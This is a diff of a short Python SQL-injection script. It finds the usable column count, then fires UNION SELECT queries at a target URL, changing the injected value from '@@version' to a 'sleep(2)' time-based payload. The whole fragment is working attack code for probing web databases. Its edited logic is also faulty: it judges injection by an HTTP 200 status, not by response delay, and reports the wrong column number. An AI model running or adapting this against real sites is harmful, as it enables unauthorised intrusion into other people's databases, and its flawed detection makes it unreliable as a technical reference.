@@ -22,17 +22,17 @@ for x in (count):
     if "Unknown column" in r:
         x = (int(x))
         x = (x-1)
-        print("number of columns usable",x)
+        print(x,"number of columns usable")
         break
 
 
-# Replace one of the values with @@version on each iteration
+#check for sleep 
 for i in range(1, x+1):
     values = ["1"]*x
-    values[i-1] = "@@version"
+    values[i-1] = "sleep(2)"
     query = url + "1 UNION SELECT " + ",".join(values) + "--"
     r = requests.get(query)
-    if "MariaDB"  in r.text:
+    if r.status_code == 200:
         print("Column", (i + 1), "is injectable")
         break 
     else:
